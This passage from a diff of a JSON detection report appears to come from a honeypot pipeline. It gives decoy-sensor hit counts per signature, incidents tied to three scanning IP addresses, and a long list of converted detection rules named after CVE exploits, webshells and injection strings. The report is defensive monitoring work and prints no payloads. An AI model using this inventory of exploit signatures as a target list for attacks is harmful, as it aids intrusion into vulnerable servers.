+   "sources": 2,
+   "first_ts": "2026-09-24 11:47:13.158986+00:00",
+   "last_ts": "2026-09-25 22:37:59.603042+00:00",
+   "normal_marked": 0
+  },
+  {
+   "rule": "R105",
+   "signature": "dlink-hnap",
+   "requests": 2,
+   "by_sensor": {
+    "decoy": 2
+   },
+   "sources": 2,
+   "first_ts": "2026-09-24 11:47:13.332827+00:00",
+   "last_ts": "2026-09-25 22:37:59.603861+00:00",
+   "normal_marked": 0
+  },
+  {
+   "rule": "R105",
+   "signature": "exchange-owa",
+   "requests": 4,
+   "by_sensor": {
+    "decoy": 4
+   },
+   "sources": 2,
+   "first_ts": "2026-09-24 11:47:19.650231+00:00",
+   "last_ts": "2026-09-25 22:38:09.233832+00:00",
+   "normal_marked": 0
+  },
+  {
+   "rule": "R105",
+   "signature": "geoserver",
+   "requests": 9,
+   "by_sensor": {
+    "decoy": 9
+   },
+   "sources": 3,
+   "first_ts": "2026-09-20 12:30:44.531867+00:00",
+   "last_ts": "2026-09-25 22:38:13.883810+00:00",
+   "normal_marked": 0
+  },
+  {
+   "rule": "R105",
+   "signature": "ivanti-connect-secure",
+   "requests": 2,
+   "by_sensor": {
+    "decoy": 2
+   },
+   "sources": 2,
+   "first_ts": "2026-09-24 11:47:13.208319+00:00",
+   "last_ts": "2026-09-25 22:37:59.602358+00:00",
+   "normal_marked": 0
+  },
+  {
+   "rule": "R105",
+   "signature": "ivanti-vtm",
+   "requests": 2,
+   "by_sensor": {
+    "decoy": 2
+   },
+   "sources": 2,
+   "first_ts": "2026-09-24 11:47:19.360224+00:00",
+   "last_ts": "2026-09-25 22:38:06.816369+00:00",
+   "normal_marked": 0
+  },
+  {
+   "rule": "R105",
+   "signature": "qnap-qts",
+   "requests": 2,
+   "by_sensor": {
+    "decoy": 2
+   },
+   "sources": 2,
+   "first_ts": "2026-09-24 11:47:29.757847+00:00",
+   "last_ts": "2026-09-25 22:38:13.663212+00:00",
+   "normal_marked": 0
+  },
+  {
+   "rule": "R105",
+   "signature": "samsung-magicinfo",
+   "requests": 2,
+   "by_sensor": {
+    "decoy": 2
+   },
+   "sources": 2,
+   "first_ts": "2026-09-24 11:47:30.440374+00:00",
+   "last_ts": "2026-09-25 22:38:15.196855+00:00",
+   "normal_marked": 0
+  },
+  {
+   "rule": "R106",
+   "signature": "apache-path-traversal",
+   "requests": 0,
+   "by_sensor": {},
+   "sources": 0,
+   "first_ts": null,
+   "last_ts": null,
+   "normal_marked": 0
+  },
+  {
+   "rule": "R106",
+   "signature": "gpon-diag-form",
+   "requests": 0,
+   "by_sensor": {},
+   "sources": 0,
+   "first_ts": null,
+   "last_ts": null,
+   "normal_marked": 0
+  },
+  {
+   "rule": "R106",
+   "signature": "hikvision-weblanguage",
+   "requests": 0,
+   "by_sensor": {},
+   "sources": 0,
+   "first_ts": null,
+   "last_ts": null,
+   "normal_marked": 0
+  },
+  {
+   "rule": "R106",
+   "signature": "log4shell-in-path",
+   "requests": 0,
+   "by_sensor": {},
+   "sources": 0,
+   "first_ts": null,
+   "last_ts": null,
+   "normal_marked": 0
+  },
+  {
+   "rule": "R106",
+   "signature": "phpunit-eval-stdin",
+   "requests": 0,
+   "by_sensor": {},
+   "sources": 0,
+   "first_ts": null,
+   "last_ts": null,
+   "normal_marked": 0
+  }
+ ],
+ "incidents": {
+  "R107_sg1": 0,
+  "R107_by_signature": {},
+  "overlapping_c1": [],
+  "same_source_c1_any_time": 0,
+  "c1_existing": [
+   {
+    "rule": "R105",
+    "actor_ip": "74.82.47.3",
+    "first_ts": "2026-09-20 12:30:44.531867+00",
+    "last_ts": "2026-09-20 12:30:44.531867+00",
+    "signals": 1,
+    "signatures": [
+     "geoserver"
+    ]
+   },
+   {
+    "rule": "R105",
+    "actor_ip": "172.237.27.147",
+    "first_ts": "2026-09-24 11:47:13.158986+00",
+    "last_ts": "2026-09-24 11:47:30.440374+00",
+    "signals": 12,
+    "signatures": 8
+   },
+   {
+    "rule": "R105",
+    "actor_ip": "45.79.123.76",
+    "first_ts": "2026-09-25 22:37:59.602358+00",
+    "last_ts": "2026-09-25 22:38:15.196855+00",
+    "signals": 12,
+    "signatures": 8
+   }
+  ],
+  "first_production_run_note": "다리는 --since 없이 전 기간을 돈다. 덤프 시점(9/28 07:30) 데이터로는 sg1 첫 실행이 R107 사건 0 을 만든다(과거 요청으로 통보가 몰리지 않는다)"
+ },
+ "normal": {
+  "generator": "detector/normal_traffic.py --apply (--allow-port 5432, 러너 안)",
+  "definition": "normal49-1",
+  "window_start": "2026-09-28T08:30:00+00:00",
+  "window_end": "2026-09-28T16:30:00+00:00",
+  "rows_inserted": 66,
+  "nginx_request_rows": 38,
+  "incident_keys_unchanged": true,
+  "sg1_hits": 0,
+  "sgx_hits": 0,
+  "c1_hits": 0,
+  "R107_incidents_in_window": 0
+ },
+ "sgx_totals": {
+  "rules_converted": 76,
+  "rules_pure_converted": 70,
+  "signatures": 94,
+  "rules_hit_real": 0,
+  "rules_pure_hit_real": 0,
+  "requests_hit_real": 0,
+  "rules_hit_normal": 0,
+  "requests_hit_normal": 0
+ },
+ "sgx_rules": [
+  {
+   "path": "rules/web/webserver_generic/web_f5_tm_utility_bash_api_request.yml",
+   "title": "F5 BIG-IP iControl Rest API Command Execution - Webserver",
+   "pure": true,
+   "signatures": [
+    "sg-f5-tm-utility-bash-api-request"
+   ],
+   "selected": false,
+   "requests": 0,
+   "by_sensor": {},
+   "sources": 0,
+   "first_ts": null,
+   "last_ts": null,
+   "also_c1_any": 0,
+   "normal_marked": 0
+  },
+  {
+   "path": "rules/web/webserver_generic/web_iis_tilt_shortname_scan.yml",
+   "title": "Successful IIS Shortname Fuzzing Scan",
+   "pure": true,
+   "signatures": [
+    "sg-iis-tilt-shortname-scan"
+   ],
+   "selected": false,
+   "requests": 0,
+   "by_sensor": {},
+   "sources": 0,
+   "first_ts": null,
+   "last_ts": null,
+   "also_c1_any": 0,
+   "normal_marked": 0
+  },
+  {
+   "path": "rules/web/webserver_generic/web_java_payload_in_access_logs.yml",
+   "title": "Java Payload Strings",
+   "pure": true,
+   "signatures": [
+    "sg-java-payload-in-access-logs"
+   ],
+   "selected": false,
+   "requests": 0,
+   "by_sensor": {},
+   "sources": 0,
+   "first_ts": null,
+   "last_ts": null,
+   "also_c1_any": 0,
+   "normal_marked": 0
+  },
+  {
+   "path": "rules/web/webserver_generic/web_jndi_exploit.yml",
+   "title": "JNDIExploit Pattern",
+   "pure": true,
+   "signatures": [
+    "sg-jndi-exploit"
+   ],
+   "selected": false,
+   "requests": 0,
+   "by_sensor": {},
+   "sources": 0,
+   "first_ts": null,
+   "last_ts": null,
+   "also_c1_any": 0,
+   "normal_marked": 0
+  },
+  {
+   "path": "rules/web/webserver_generic/web_path_traversal_exploitation_attempt.yml",
+   "title": "Path Traversal Exploitation Attempts",
+   "pure": true,
+   "signatures": [
+    "sg-path-traversal-exploitation-attempt"
+   ],
+   "selected": true,
+   "requests": 0,
+   "by_sensor": {},
+   "sources": 0,
+   "first_ts": null,
+   "last_ts": null,
+   "also_c1_any": 0,
+   "normal_marked": 0
+  },
+  {
+   "path": "rules/web/webserver_generic/web_source_code_enumeration.yml",
+   "title": "Source Code Enumeration Detection by Keyword",
+   "pure": true,
+   "signatures": [
+    "sg-source-code-enumeration"
+   ],
+   "selected": false,
+   "requests": 0,
+   "by_sensor": {},
+   "sources": 0,
+   "first_ts": null,
+   "last_ts": null,
+   "also_c1_any": 0,
+   "normal_marked": 0
+  },
+  {
+   "path": "rules/web/webserver_generic/web_sql_injection_in_access_logs.yml",
+   "title": "SQL Injection Strings In URI",
+   "pure": true,
+   "signatures": [
+    "sg-sql-injection-in-access-logs"
+   ],
+   "selected": false,
+   "requests": 0,
+   "by_sensor": {},
+   "sources": 0,
+   "first_ts": null,
+   "last_ts": null,
+   "also_c1_any": 0,
+   "normal_marked": 0
+  },
+  {
+   "path": "rules/web/webserver_generic/web_ssti_in_access_logs.yml",
+   "title": "Server Side Template Injection Strings",
+   "pure": true,
+   "signatures": [
+    "sg-ssti-in-access-logs"
+   ],
+   "selected": false,
+   "requests": 0,
+   "by_sensor": {},
+   "sources": 0,
+   "first_ts": null,
+   "last_ts": null,
+   "also_c1_any": 0,
+   "normal_marked": 0
+  },
+  {
+   "path": "rules/web/webserver_generic/web_susp_windows_path_uri.yml",
+   "title": "Suspicious Windows Strings In URI",
+   "pure": true,
+   "signatures": [
+    "sg-susp-windows-path-uri"
+   ],
+   "selected": false,
+   "requests": 0,
+   "by_sensor": {},
+   "sources": 0,
+   "first_ts": null,
+   "last_ts": null,
+   "also_c1_any": 0,
+   "normal_marked": 0
+  },
+  {
+   "path": "rules/web/webserver_generic/web_win_webshells_in_access_logs.yml",
+   "title": "Windows Webshell Strings",
+   "pure": true,
+   "signatures": [
+    "sg-win-webshells-in-access-logs"
+   ],
+   "selected": false,
+   "requests": 0,
+   "by_sensor": {},
+   "sources": 0,
+   "first_ts": null,
+   "last_ts": null,
+   "also_c1_any": 0,
+   "normal_marked": 0
+  },
+  {
+   "path": "rules/web/webserver_generic/web_xss_in_access_logs.yml",
+   "title": "Cross Site Scripting Strings",
+   "pure": true,
+   "signatures": [
+    "sg-xss-in-access-logs"
+   ],
+   "selected": false,
+   "requests": 0,
+   "by_sensor": {},
+   "sources": 0,
+   "first_ts": null,
+   "last_ts": null,
+   "also_c1_any": 0,
+   "normal_marked": 0
+  },
+  {
+   "path": "rules-emerging-threats/2010/Exploits/CVE-2010-5278/web_cve_2010_5278_exploitation_attempt.yml",
+   "title": "CVE-2010-5278 Exploitation Attempt",
+   "pure": true,
+   "signatures": [
+    "sg-cve-2010-5278-exploitation-attempt"
+   ],
+   "selected": false,
+   "requests": 0,
+   "by_sensor": {},
+   "sources": 0,
+   "first_ts": null,
+   "last_ts": null,
+   "also_c1_any": 0,
+   "normal_marked": 0
+  },
+  {
+   "path": "rules-emerging-threats/2014/Exploits/CVE-2014-6287/web_cve_2014_6287_hfs_rce.yml",
+   "title": "Rejetto HTTP File Server RCE",
+   "pure": true,
+   "signatures": [
+    "sg-cve-2014-6287-hfs-rce"
+   ],
+   "selected": false,
+   "requests": 0,
+   "by_sensor": {},
+   "sources": 0,
+   "first_ts": null,
+   "last_ts": null,
+   "also_c1_any": 0,
+   "normal_marked": 0
+  },
+  {
+   "path": "rules-emerging-threats/2018/Exploits/CVE-2018-13379/web_cve_2018_13379_fortinet_preauth_read_exploit.yml",
+   "title": "Fortinet CVE-2018-13379 Exploitation",
+   "pure": true,
+   "signatures": [
+    "sg-cve-2018-13379-fortinet-preauth-read"
+   ],
+   "selected": false,
+   "requests": 0,
+   "by_sensor": {},
+   "sources": 0,
+   "first_ts": null,
+   "last_ts": null,
+   "also_c1_any": 0,
+   "normal_marked": 0
+  },
+  {
+   "path": "rules-emerging-threats/2018/Exploits/CVE-2018-2894/web_cve_2018_2894_weblogic_exploit.yml",
+   "title": "Oracle WebLogic Exploit",
+   "pure": true,
+   "signatures": [
+    "sg-cve-2018-2894-weblogic-exploit"
+   ],
+   "selected": false,
+   "requests": 0,
+   "by_sensor": {},
+   "sources": 0,
+   "first_ts": null,
+   "last_ts": null,
+   "also_c1_any": 0,
+   "normal_marked": 0
+  },
+  {
+   "path": "rules-emerging-threats/2019/Exploits/CVE-2019-11510/web_cve_2019_11510_pulsesecure_exploit.yml",
+   "title": "Pulse Secure Attack CVE-2019-11510",
+   "pure": true,
+   "signatures": [
+    "sg-cve-2019-11510-pulsesecure-exploit"
+   ],
+   "selected": true,
+   "requests": 0,
+   "by_sensor": {},
+   "sources": 0,
+   "first_ts": null,
+   "last_ts": null,
+   "also_c1_any": 0,
+   "normal_marked": 0
+  },
+  {
+   "path": "rules-emerging-threats/2019/Exploits/CVE-2019-19781/web_cve_2019_19781_citrix_exploit.yml",
+   "title": "Citrix Netscaler Attack CVE-2019-19781",
+   "pure": true,
+   "signatures": [
+    "sg-cve-2019-19781-citrix-exploit-1",
+    "sg-cve-2019-19781-citrix-exploit-2",
+    "sg-cve-2019-19781-citrix-exploit-3"
+   ],
+   "selected": false,
+   "requests": 0,
+   "by_sensor": {},
+   "sources": 0,
+   "first_ts": null,
+   "last_ts": null,
+   "also_c1_any": 0,
+   "normal_marked": 0
+  },
+  {
+   "path": "rules-emerging-threats/2019/Exploits/CVE-2019-3398/web_cve_2019_3398_confluence.yml",
+   "title": "Confluence Exploitation CVE-2019-3398",
+   "pure": true,
+   "signatures": [
+    "sg-cve-2019-3398-confluence"
+   ],
+   "selected": true,
+   "requests": 0,
+   "by_sensor": {},
+   "sources": 0,
+   "first_ts": null,
+   "last_ts": null,
+   "also_c1_any": 0,
+   "normal_marked": 0
+  },
+  {
+   "path": "rules-emerging-threats/2020/Exploits/CVE-2020-0688/web_cve_2020_0688_exchange_exploit.yml",
+   "title": "CVE-2020-0688 Exploitation Attempt",
+   "pure": true,
+   "signatures": [
+    "sg-cve-2020-0688-exchange-exploit"
+   ],
+   "selected": false,
+   "requests": 0,
+   "by_sensor": {},
+   "sources": 0,
+   "first_ts": null,
+   "last_ts": null,
+   "also_c1_any": 0,
+   "normal_marked": 0
+  },
+  {
+   "path": "rules-emerging-threats/2020/Exploits/CVE-2020-0688/web_cve_2020_0688_msexchange.yml",
+   "title": "CVE-2020-0688 Exchange Exploitation via Web Log",
+   "pure": true,
+   "signatures": [
+    "sg-cve-2020-0688-msexchange"
+   ],
+   "selected": true,
+   "requests": 0,
+   "by_sensor": {},
+   "sources": 0,
+   "first_ts": null,
+   "last_ts": null,
+   "also_c1_any": 0,
+   "normal_marked": 0
+  },
+  {
+   "path": "rules-emerging-threats/2020/Exploits/CVE-2020-10148/web_cve_2020_10148_solarwinds_exploit.yml",
+   "title": "CVE-2020-10148 SolarWinds Orion API Auth Bypass",
+   "pure": true,
+   "signatures": [
+    "sg-cve-2020-10148-solarwinds-exploit"
+   ],
+   "selected": false,
+   "requests": 0,
+   "by_sensor": {},
+   "sources": 0,
+   "first_ts": null,
+   "last_ts": null,
+   "also_c1_any": 0,
+   "normal_marked": 0
+  },
+  {
+   "path": "rules-emerging-threats/2020/Exploits/CVE-2020-14882/web_cve_2020_14882_weblogic_exploit.yml",
+   "title": "Oracle WebLogic Exploit CVE-2020-14882",
+   "pure": true,
+   "signatures": [
+    "sg-cve-2020-14882-weblogic-exploit"
+   ],
+   "selected": false,
+   "requests": 0,
+   "by_sensor": {},
+   "sources": 0,
+   "first_ts": null,
+   "last_ts": null,
+   "also_c1_any": 0,
+   "normal_marked": 0
+  },
+  {
+   "path": "rules-emerging-threats/2020/Exploits/CVE-2020-28188/web_cve_2020_28188_terramaster_rce_exploit.yml",
+   "title": "TerraMaster TOS CVE-2020-28188",
+   "pure": true,
+   "signatures": [
+    "sg-cve-2020-28188-terramaster-rce"
+   ],
+   "selected": false,
+   "requests": 0,
+   "by_sensor": {},
+   "sources": 0,
+   "first_ts": null,
+   "last_ts": null,
+   "also_c1_any": 0,
+   "normal_marked": 0
+  },
+  {
+   "path": "rules-emerging-threats/2020/Exploits/CVE-2020-3452/web_cve_2020_3452_cisco_asa_ftd.yml",
+   "title": "Cisco ASA FTD Exploit CVE-2020-3452",
+   "pure": true,
+   "signatures": [
+    "sg-cve-2020-3452-cisco-asa-ftd"
+   ],
+   "selected": false,
+   "requests": 0,
+   "by_sensor": {},
+   "sources": 0,
+   "first_ts": null,
+   "last_ts": null,
+   "also_c1_any": 0,
+   "normal_marked": 0
+  },
+  {
+   "path": "rules-emerging-threats/2020/Exploits/CVE-2020-5902/web_cve_2020_5902_f5_bigip.yml",
+   "title": "CVE-2020-5902 F5 BIG-IP Exploitation Attempt",
+   "pure": true,
+   "signatures": [
+    "sg-cve-2020-5902-f5-bigip"
+   ],
+   "selected": false,
+   "requests": 0,
+   "by_sensor": {},
+   "sources": 0,
+   "first_ts": null,
+   "last_ts": null,
+   "also_c1_any": 0,
+   "normal_marked": 0
+  },
+  {
+   "path": "rules-emerging-threats/2020/Exploits/CVE-2020-8193/web_cve_2020_8193_8195_citrix_exploit.yml",
+   "title": "Citrix ADS Exploitation CVE-2020-8193 CVE-2020-8195",
+   "pure": true,
+   "signatures": [
+    "sg-cve-2020-8193-8195-citrix-exploit-1",
+    "sg-cve-2020-8193-8195-citrix-exploit-2"
+   ],
+   "selected": false,
+   "requests": 0,
+   "by_sensor": {},
+   "sources": 0,
+   "first_ts": null,
+   "last_ts": null,
+   "also_c1_any": 0,
+   "normal_marked": 0
+  },
+  {
+   "path": "rules-emerging-threats/2020/TA/SolarWinds-Supply-Chain/web_solarwinds_supernova_webshell.yml",
+   "title": "Solarwinds SUPERNOVA Webshell Access",
+   "pure": true,
+   "signatures": [
+    "sg-solarwinds-supernova-webshell-1",
+    "sg-solarwinds-supernova-webshell-2"
+   ],
+   "selected": false,
+   "requests": 0,
+   "by_sensor": {},
+   "sources": 0,
+   "first_ts": null,
+   "last_ts": null,
+   "also_c1_any": 0,
+   "normal_marked": 0
+  },
+  {
+   "path": "rules-emerging-threats/2021/Exploits/CVE-2021-20090/web_cve_2021_20090_2021_20091_arcadyan_router_exploit.yml",
+   "title": "Arcadyan Router Exploitations",
+   "pure": true,
+   "signatures": [
+    "sg-cve-2021-20090-2021-20091-arcadyan-1",
+    "sg-cve-2021-20090-2021-20091-arcadyan-2"
+   ],
+   "selected": false,
+   "requests": 0,
+   "by_sensor": {},
+   "sources": 0,
+   "first_ts": null,
+   "last_ts": null,
+   "also_c1_any": 0,
+   "normal_marked": 0
+  },
+  {
+   "path": "rules-emerging-threats/2021/Exploits/CVE-2021-2109/web_cve_2021_2109_weblogic_rce_exploit.yml",
+   "title": "Oracle WebLogic Exploit CVE-2021-2109",
+   "pure": true,
+   "signatures": [
+    "sg-cve-2021-2109-weblogic-rce-exploit"
+   ],
+   "selected": false,
+   "requests": 0,
+   "by_sensor": {},
+   "sources": 0,
+   "first_ts": null,
+   "last_ts": null,
+   "also_c1_any": 0,
+   "normal_marked": 0
+  },
+  {
+   "path": "rules-emerging-threats/2021/Exploits/CVE-2021-21972/web_cve_2021_21972_vsphere_unauth_rce_exploit.yml",
+   "title": "CVE-2021-21972 VSphere Exploitation",
+   "pure": true,
+   "signatures": [
+    "sg-cve-2021-21972-vsphere-unauth-rce"
+   ],
+   "selected": false,
+   "requests": 0,
+   "by_sensor": {},
+   "sources": 0,
+   "first_ts": null,
+   "last_ts": null,
+   "also_c1_any": 0,
+   "normal_marked": 0
+  },
+  {
+   "path": "rules-emerging-threats/2021/Exploits/CVE-2021-21978/web_cve_2021_21978_vmware_view_planner_exploit.yml",
+   "title": "CVE-2021-21978 Exploitation Attempt",
+   "pure": true,
+   "signatures": [
+    "sg-cve-2021-21978-vmware-view-planner"
+   ],
+   "selected": false,
+   "requests": 0,
+   "by_sensor": {},
+   "sources": 0,
+   "first_ts": null,
+   "last_ts": null,
+   "also_c1_any": 0,
+   "normal_marked": 0
+  },
+  {
+   "path": "rules-emerging-threats/2021/Exploits/CVE-2021-22005/web_cve_2021_22005_vmware_file_upload.yml",
+   "title": "VMware vCenter Server File Upload CVE-2021-22005",
+   "pure": true,
+   "signatures": [
+    "sg-cve-2021-22005-vmware-file-upload"
+   ],
+   "selected": false,
+   "requests": 0,
+   "by_sensor": {},
+   "sources": 0,
+   "first_ts": null,
+   "last_ts": null,
+   "also_c1_any": 0,
+   "normal_marked": 0
+  },
+  {
+   "path": "rules-emerging-threats/2021/Exploits/CVE-2021-22123/web_cve_2021_22123_fortinet_exploit.yml",
+   "title": "Fortinet CVE-2021-22123 Exploitation",
+   "pure": false,
+   "signatures": [
+    "sg-cve-2021-22123-fortinet-exploit"
+   ],
+   "selected": false,
+   "requests": 0,
+   "by_sensor": {},
+   "sources": 0,
+   "first_ts": null,
+   "last_ts": null,
+   "also_c1_any": 0,
+   "normal_marked": 0
+  },
+  {
+   "path": "rules-emerging-threats/2021/Exploits/CVE-2021-22893/web_cve_2021_22893_pulse_secure_rce_exploit.yml",
+   "title": "Pulse Connect Secure RCE Attack CVE-2021-22893",
+   "pure": true,
+   "signatures": [
+    "sg-cve-2021-22893-pulse-secure-rce"
+   ],
+   "selected": true,
+   "requests": 0,
+   "by_sensor": {},
+   "sources": 0,
+   "first_ts": null,
+   "last_ts": null,
+   "also_c1_any": 0,
+   "normal_marked": 0
+  },
+  {
+   "path": "rules-emerging-threats/2021/Exploits/CVE-2021-26814/web_cve_2021_26814_wzuh_rce.yml",
+   "title": "Exploitation of CVE-2021-26814 in Wazuh",
+   "pure": true,
+   "signatures": [
+    "sg-cve-2021-26814-wzuh-rce"
+   ],
+   "selected": false,
+   "requests": 0,
+   "by_sensor": {},
+   "sources": 0,
+   "first_ts": null,
+   "last_ts": null,
+   "also_c1_any": 0,
+   "normal_marked": 0
+  },
+  {
+   "path": "rules-emerging-threats/2021/Exploits/CVE-2021-26858/web_cve_2021_26858_iis_rce.yml",
+   "title": "ProxyLogon Reset Virtual Directories Based On IIS Log",
+   "pure": false,
+   "signatures": [
+    "sg-cve-2021-26858-iis-rce"
+   ],
+   "selected": false,
+   "requests": 0,
+   "by_sensor": {},
+   "sources": 0,
+   "first_ts": null,
+   "last_ts": null,
+   "also_c1_any": 0,
+   "normal_marked": 0
+  },
+  {
+   "path": "rules-emerging-threats/2021/Exploits/CVE-2021-27905/web_cve_2021_27905_apache_solr_exploit.yml",
+   "title": "Potential CVE-2021-27905 Exploitation Attempt",
+   "pure": true,
+   "signatures": [
+    "sg-cve-2021-27905-apache-solr-exploit-1",
+    "sg-cve-2021-27905-apache-solr-exploit-2"
+   ],
+   "selected": false,
+   "requests": 0,
+   "by_sensor": {},
+   "sources": 0,
+   "first_ts": null,
+   "last_ts": null,
+   "also_c1_any": 0,
+   "normal_marked": 0
+  },
+  {
+   "path": "rules-emerging-threats/2021/Exploits/CVE-2021-28480/web_cve_2021_28480_exchange_exploit.yml",
+   "title": "Exchange Exploitation CVE-2021-28480",
+   "pure": true,
+   "signatures": [
+    "sg-cve-2021-28480-exchange-exploit"
+   ],
+   "selected": false,
+   "requests": 0,
+   "by_sensor": {},
+   "sources": 0,
+   "first_ts": null,
+   "last_ts": null,
+   "also_c1_any": 0,
+   "normal_marked": 0
+  },
+  {
+   "path": "rules-emerging-threats/2021/Exploits/CVE-2021-33766/web_cve_2021_33766_msexchange_proxytoken.yml",
+   "title": "CVE-2021-33766 Exchange ProxyToken Exploitation",
+   "pure": true,
+   "signatures": [
+    "sg-cve-2021-33766-msexchange-1",
+    "sg-cve-2021-33766-msexchange-2"
+   ],
+   "selected": false,
+   "requests": 0,
+   "by_sensor": {},
+   "sources": 0,
+   "first_ts": null,
+   "last_ts": null,
+   "also_c1_any": 0,
+   "normal_marked": 0
+  },
+  {
+   "path": "rules-emerging-threats/2021/Exploits/CVE-2021-40539/web_cve_2021_40539_adselfservice.yml",
+   "title": "ADSelfService Exploitation",
+   "pure": true,
+   "signatures": [
+    "sg-cve-2021-40539-adselfservice"
+   ],
+   "selected": false,
+   "requests": 0,
+   "by_sensor": {},
+   "sources": 0,
+   "first_ts": null,
+   "last_ts": null,
+   "also_c1_any": 0,
+   "normal_marked": 0
+  },
+  {
+   "path": "rules-emerging-threats/2021/Exploits/CVE-2021-40539/web_cve_2021_40539_manageengine_adselfservice_exploit.yml",
+   "title": "CVE-2021-40539 Zoho ManageEngine ADSelfService Plus Exploit",
+   "pure": true,
+   "signatures": [
+    "sg-cve-2021-40539-manageengine"
+   ],
+   "selected": false,
+   "requests": 0,
+   "by_sensor": {},
+   "sources": 0,
+   "first_ts": null,
+   "last_ts": null,
+   "also_c1_any": 0,
+   "normal_marked": 0
+  },
+  {
+   "path": "rules-emerging-threats/2021/Exploits/CVE-2021-41773/web_cve_2021_41773_apache_path_traversal.yml",
+   "title": "CVE-2021-41773 Exploitation Attempt",
+   "pure": true,
+   "signatures": [
+    "sg-cve-2021-41773-apache-path-traversal"
+   ],
+   "selected": true,
+   "requests": 0,
+   "by_sensor": {},
+   "sources": 0,
+   "first_ts": null,
+   "last_ts": null,
+   "also_c1_any": 0,
+   "normal_marked": 0
+  },
+  {
+   "path": "rules-emerging-threats/2021/Exploits/CVE-2021-42237/web_cve_2021_42237_sitecore_report_ashx.yml",
+   "title": "Sitecore Pre-Auth RCE CVE-2021-42237",
+   "pure": true,
+   "signatures": [
+    "sg-cve-2021-42237-sitecore-report-ashx"
+   ],
+   "selected": false,
+   "requests": 0,
+   "by_sensor": {},
+   "sources": 0,
+   "first_ts": null,
+   "last_ts": null,
+   "also_c1_any": 0,
+   "normal_marked": 0
+  },
+  {
+   "path": "rules-emerging-threats/2021/Exploits/CVE-2021-43798/web_cve_2021_43798_grafana.yml",
+   "title": "Grafana Path Traversal Exploitation CVE-2021-43798",
+   "pure": true,
+   "signatures": [
+    "sg-cve-2021-43798-grafana"
+   ],
+   "selected": false,
+   "requests": 0,
+   "by_sensor": {},
+   "sources": 0,
+   "first_ts": null,
+   "last_ts": null,
+   "also_c1_any": 0,
+   "normal_marked": 0
+  },
+  {
+   "path": "rules-emerging-threats/2021/Exploits/CVE-2021-44228/web_cve_2021_44228_log4j.yml",
+   "title": "Log4j RCE CVE-2021-44228 Generic",
+   "pure": true,
+   "signatures": [
+    "sg-cve-2021-44228-log4j"
+   ],
+   "selected": true,
+   "requests": 0,
+   "by_sensor": {},
+   "sources": 0,
+   "first_ts": null,
+   "last_ts": null,
+   "also_c1_any": 0,
+   "normal_marked": 0
+  },
+  {
+   "path": "rules-emerging-threats/2021/Exploits/CVE-2021-44228/web_cve_2021_44228_log4j_fields.yml",
+   "title": "Log4j RCE CVE-2021-44228 in Fields",
+   "pure": false,
+   "signatures": [
+    "sg-cve-2021-44228-log4j-fields"
+   ],
+   "selected": false,
+   "requests": 0,
+   "by_sensor": {},
+   "sources": 0,
+   "first_ts": null,
+   "last_ts": null,
+   "also_c1_any": 0,
+   "normal_marked": 0
+  },
+  {
+   "path": "rules-emerging-threats/2021/Exploits/ProxyShell-Exploit/web_exchange_proxyshell.yml",
+   "title": "Exchange ProxyShell Pattern",
+   "pure": true,
+   "signatures": [
+    "sg-exchange-proxyshell-1",
+    "sg-exchange-proxyshell-2"
+   ],
+   "selected": true,
+   "requests": 0,
+   "by_sensor": {},
+   "sources": 0,
+   "first_ts": null,
+   "last_ts": null,
+   "also_c1_any": 0,
+   "normal_marked": 0
+  },
+  {
+   "path": "rules-emerging-threats/2021/Exploits/ProxyShell-Exploit/web_exchange_proxyshell_successful.yml",
+   "title": "Successful Exchange ProxyShell Attack",
+   "pure": true,
+   "signatures": [
+    "sg-exchange-proxyshell-successful"
+   ],
+   "selected": false,
+   "requests": 0,
+   "by_sensor": {},
+   "sources": 0,
+   "first_ts": null,
+   "last_ts": null,
+   "also_c1_any": 0,
+   "normal_marked": 0
+  },
+  {
+   "path": "rules-emerging-threats/2021/TA/HAFNIUM/web_exchange_exploitation_hafnium.yml",
+   "title": "Exchange Exploitation Used by HAFNIUM",
+   "pure": false,
+   "signatures": [
+    "sg-exchange-exploitation-hafnium-1",
+    "sg-exchange-exploitation-hafnium-2",
+    "sg-exchange-exploitation-hafnium-3"
+   ],
+   "selected": false,
+   "requests": 0,
+   "by_sensor": {},
+   "sources": 0,
+   "first_ts": null,
+   "last_ts": null,
+   "also_c1_any": 0,
+   "normal_marked": 0
+  },
+  {
+   "path": "rules-emerging-threats/2021/TA/UNC2546/web_unc2546_dewmode_php_webshell.yml",
+   "title": "DEWMODE Webshell Access",
+   "pure": true,
+   "signatures": [
+    "sg-unc2546-dewmode-php-webshell-1",
+    "sg-unc2546-dewmode-php-webshell-2"
+   ],
+   "selected": false,
+   "requests": 0,
+   "by_sensor": {},
+   "sources": 0,
+   "first_ts": null,
+   "last_ts": null,
+   "also_c1_any": 0,
+   "normal_marked": 0
+  },
+  {
+   "path": "rules-emerging-threats/2022/Exploits/CVE-2022-21587/web_cve_2022_21587_oracle_ebs.yml",
+   "title": "Potential CVE-2022-21587 Exploitation Attempt",
+   "pure": true,
+   "signatures": [
+    "sg-cve-2022-21587-oracle-ebs"
+   ],
+   "selected": false,
+   "requests": 0,
+   "by_sensor": {},
+   "sources": 0,
+   "first_ts": null,
+   "last_ts": null,
+   "also_c1_any": 0,
+   "normal_marked": 0
+  },
+  {
+   "path": "rules-emerging-threats/2022/Exploits/CVE-2022-27925/web_cve_2022_27925_exploit.yml",
+   "title": "Zimbra Collaboration Suite Email Server Unauthenticated RCE",
+   "pure": true,
+   "signatures": [
+    "sg-cve-2022-27925-exploit"
+   ],
+   "selected": false,
+   "requests": 0,
+   "by_sensor": {},
+   "sources": 0,
+   "first_ts": null,
+   "last_ts": null,
+   "also_c1_any": 0,
+   "normal_marked": 0
+  },
+  {
+   "path": "rules-emerging-threats/2022/Exploits/CVE-2022-31656/web_cve_2022_31656_auth_bypass.yml",
+   "title": "CVE-2022-31656 VMware Workspace ONE Access Auth Bypass",
+   "pure": true,
+   "signatures": [
+    "sg-cve-2022-31656-auth-bypass"
+   ],
+   "selected": false,
+   "requests": 0,
+   "by_sensor": {},
+   "sources": 0,
+   "first_ts": null,
+   "last_ts": null,
+   "also_c1_any": 0,
+   "normal_marked": 0
+  },
+  {
+   "path": "rules-emerging-threats/2022/Exploits/CVE-2022-31659/web_cve_2022_31659_vmware_rce.yml",
+   "title": "CVE-2022-31659 VMware Workspace ONE Access RCE",
+   "pure": true,
+   "signatures": [
+    "sg-cve-2022-31659-vmware-rce"
+   ],
+   "selected": false,
+   "requests": 0,
+   "by_sensor": {},
+   "sources": 0,
+   "first_ts": null,
+   "last_ts": null,
+   "also_c1_any": 0,
+   "normal_marked": 0
+  },
+  {
